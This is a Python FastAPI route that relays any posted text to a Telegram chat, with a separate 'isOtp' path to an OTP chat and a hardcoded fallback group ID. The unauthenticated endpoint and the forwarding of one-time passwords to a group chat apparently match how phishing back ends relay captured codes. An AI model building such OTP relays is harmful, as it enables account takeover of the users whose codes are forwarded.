
import os
from fastapi import APIRouter, Request
from services.database import db # Import db to log events

router = APIRouter()

@router.post("/telegram-message")
async def telegram_log(request: Request):
    app_state = request.app.state
    try:
        data = await request.json()
        is_otp = data.get("isOtp", False)
        
        # Fetch system config for dynamic chat IDs
        system_config = db.get("system_config", {}) 
        
        if is_otp:
            chat_id = system_config.get("otp", {}).get("chat_id")
            if not chat_id:
                chat_id = os.getenv("OTP_CHAT_ID")
        else:
            chat_id = system_config.get("telegram", {}).get("chat_id")
            if not chat_id:
                chat_id = os.getenv("TELEGRAM_CHAT_ID")

        # Fallback if no chat_id found in config or env
        if not chat_id:
            chat_id = "-1002922644009" # Default hardcoded chat ID

        if not app_state.bot.is_active:
            db.log_event("TELEGRAM_ERROR", "Telegram bot is not active, message not sent.", {"chat_id": chat_id, "message_text": data.get("text")})
            return {"success": False, "message": "Telegram bot is offline."}

        await app_state.bot.send_message(chat_id, data.get("text", "System Matrix Alert"))
        db.log_event("TELEGRAM_MESSAGE_SENT", "Message sent via Telegram.", {"chat_id": chat_id, "message_text": data.get("text")})
        return {"success": True}
    except Exception as e:
        db.log_event("TELEGRAM_ERROR", f"Failed to send Telegram message: {str(e)}", {"error_details": str(e)})
        return {"success": False, "message": f"Failed to send Telegram message: {str(e)}"}
